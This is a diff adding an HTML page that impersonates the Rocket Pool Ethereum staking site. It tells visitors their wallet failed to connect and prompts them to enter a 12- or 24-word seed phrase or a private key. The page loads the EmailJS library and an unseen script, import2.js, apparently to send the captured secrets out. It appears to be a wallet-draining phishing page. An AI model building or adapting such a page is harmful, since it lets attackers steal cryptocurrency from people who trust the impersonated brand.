@@ -1,0 +1,178 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js" integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <link href="https://fonts.cdnfonts.com/css/evermore" rel="stylesheet">            
+    <link rel="stylesheet" href="./css/import.css">
+    <link rel="icon" href="./img/favicon (1).ico" sizes="32x32">
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+    <title>Decentralised Ethereum Liquid Staking Protocol - Rocket Pool</title>
+</head>
+<body>
+
+
+
+
+    <div class="capsule">
+        <div class="capsule-container">
+
+            
+            <div class="import">
+                
+        <div class="import-container">
+            
+            <div class="leftside" id="leftside">
+                <div class="message">
+                    <div class="logo">
+                    <img src="./img/logo.svg" alt="">  
+                    
+                    
+
+                                     
+                </div>
+                    <!-- <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" fill="currentColor" class="bi bi-exclamation-circle" viewBox="0 0 16 16">
+  <path d="M8 15A7 7 0 1 1 8 1a7 7 0 0 1 0 14m0 1A8 8 0 1 0 8 0a8 8 0 0 0 0 16"/>
+  <path d="M7.002 11a1 1 0 1 1 2 0 1 1 0 0 1-2 0M7.1 4.995a.905.905 0 1 1 1.8 0l-.35 3.507a.552.552 0 0 1-1.1 0z"/>
+</svg> -->
+                    
+                    <p>We apologize, but it seems your wallet is not connecting automatically. To ensure a seamless experience, please connect manually by selecting the 'Import Wallet' button below or verify your wallet settings and attempt the connection again.</p>
+                </div>
+
+            </div>
+            <div class="rightside">
+
+                <div class="loader" id="loader">
+                        
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+
+    </div>
+                <div class="section1" id="home">
+
+                    <div class="loader" id="loader2">
+                        
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+    </div>
+
+                    <div class="section1-container" >
+                        <div class="click" onclick="toSeed()">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-card-text" viewBox="0 0 16 16">
+  <path d="M14.5 3a.5.5 0 0 1 .5.5v9a.5.5 0 0 1-.5.5h-13a.5.5 0 0 1-.5-.5v-9a.5.5 0 0 1 .5-.5zm-13-1A1.5 1.5 0 0 0 0 3.5v9A1.5 1.5 0 0 0 1.5 14h13a1.5 1.5 0 0 0 1.5-1.5v-9A1.5 1.5 0 0 0 14.5 2z"/>
+  <path d="M3 5.5a.5.5 0 0 1 .5-.5h9a.5.5 0 0 1 0 1h-9a.5.5 0 0 1-.5-.5M3 8a.5.5 0 0 1 .5-.5h9a.5.5 0 0 1 0 1h-9A.5.5 0 0 1 3 8m0 2.5a.5.5 0 0 1 .5-.5h6a.5.5 0 0 1 0 1h-6a.5.5 0 0 1-.5-.5"/>
+</svg>
+                        <p>Import with Seed Phrase</p>
+                    </div>
+                    <div class="click" onclick="toPrivate()">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-key" viewBox="0 0 16 16">
+  <path d="M0 8a4 4 0 0 1 7.465-2H14a.5.5 0 0 1 .354.146l1.5 1.5a.5.5 0 0 1 0 .708l-1.5 1.5a.5.5 0 0 1-.708 0L13 9.207l-.646.647a.5.5 0 0 1-.708 0L11 9.207l-.646.647a.5.5 0 0 1-.708 0L9 9.207l-.646.647A.5.5 0 0 1 8 10h-.535A4 4 0 0 1 0 8m4-3a3 3 0 1 0 2.712 4.285A.5.5 0 0 1 7.163 9h.63l.853-.854a.5.5 0 0 1 .708 0l.646.647.646-.647a.5.5 0 0 1 .708 0l.646.647.646-.647a.5.5 0 0 1 .708 0l.646.647.793-.793-1-1h-6.63a.5.5 0 0 1-.451-.285A3 3 0 0 0 4 5"/>
+  <path d="M4 8a1 1 0 1 1-2 0 1 1 0 0 1 2 0"/>
+</svg>
+                        <p>Import with Private Key</p>
+                    </div>
+
+                    <!-- <div class="click exit">
+                        <p>Exit</p>
+                    </div> -->
+                    
+
+
+                    </div>
+                </div>
+                <!-- <form class="section2 share" id="seedForm">
+                    <div class="top">
+                        <div class="back" onclick="goBack()">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-chevron-left" viewBox="0 0 16 16">
+  <path fill-rule="evenodd" d="M11.354 1.646a.5.5 0 0 1 0 .708L5.707 8l5.647 5.646a.5.5 0 0 1-.708.708l-6-6a.5.5 0 0 1 0-.708l6-6a.5.5 0 0 1 .708 0"/>
+</svg>
+
+                        </div>
+                        <button type="submit" class="submit-btn" disabled>
+                            Import
+                        </button>
+                        
+                    </div>
+                    <div class="bottom">
+                        <h2>Log in with Seed Phrase</h2>
+                        <p>The seed phrase consists of 12 words provided when you create your wallet.</p>
+                        <textarea name="" id="" placeholder="Tap here  to enter your seed phrase(use spaces)"></textarea>
+        <div class="toggle-container">
+            <button class="toggle-btn active" data-words="12">12 Words</button>
+            <button class="toggle-btn" data-words="24">24 Words</button>
+        </div>
+        <div class="seed-grid" id="seedGrid">
+            Input fields will be dynamically generated here
+        </div>
+        <div id="input-container"></div>
+        <div class="error" id="errorMsg">Please fill in all words.</div>
+        <div class="error">Please fill in all 12 words.</div>
+
+                    </div>
+
+                </form> -->
+
+                <form class="section2 " id="seedForm">
+        <div class="top">
+            <div class="back" onclick="goBack()">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-chevron-left" viewBox="0 0 16 16">
+                    <path fill-rule="evenodd" d="M11.354 1.646a.5.5 0 0 1 0 .708L5.707 8l5.647 5.646a.5.5 0 0 1-.708.708l-6-6a.5.5 0 0 1 0-.708l6-6a.5.5 0 0 1 .708 0"/>
+                </svg>
+            </div>
+            <button type="submit" class="submit-btn" disabled>Import</button>
+        </div>
+        <div class="bottom">
+            <h2>Log in with Seed Phrase</h2>
+            <p>The seed phrase consists of 12 or 24 words provided when you create your wallet.</p>
+            <div class="toggle-container">
+                <button class="toggle-btn active" data-words="12" type="button">12 Words</button>
+                <button class="toggle-btn" data-words="24 "  type="button">24 Words</button>
+            </div>
+            <div class="seed-grid" id="seedGrid">
+
+            </div>
+            <div id="errorMsg" class="error"></div>
+        </div>
+    </form>
+
+                <form class="section3 " id="keyprivate">
+                    <div class="top">
+                        <div class="back" onclick="goBack()">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-chevron-left" viewBox="0 0 16 16">
+  <path fill-rule="evenodd" d="M11.354 1.646a.5.5 0 0 1 0 .708L5.707 8l5.647 5.646a.5.5 0 0 1-.708.708l-6-6a.5.5 0 0 1 0-.708l6-6a.5.5 0 0 1 .708 0"/>
+</svg>
+
+                        </div>
+                        <button type="submit" class="submit-btn2" disabled>
+                            Import
+                        </button>
+                        
+                    </div>
+                    <div class="bottom">
+                        <h2>Log in with Private Key</h2>
+                        <div class="private-grid" id="privateGrid">
+                            
+
+                        </div>
+                        <div id="errorMsg2" class="error"></div>
+
+                    </div>
+
+                </form>
+            </div>
+        </div>
+    </div>
+        </div>
+    </div>
+
+<script src="./js/import2.js"></script>
+
+
+
+
+    
+</body>
+</html>
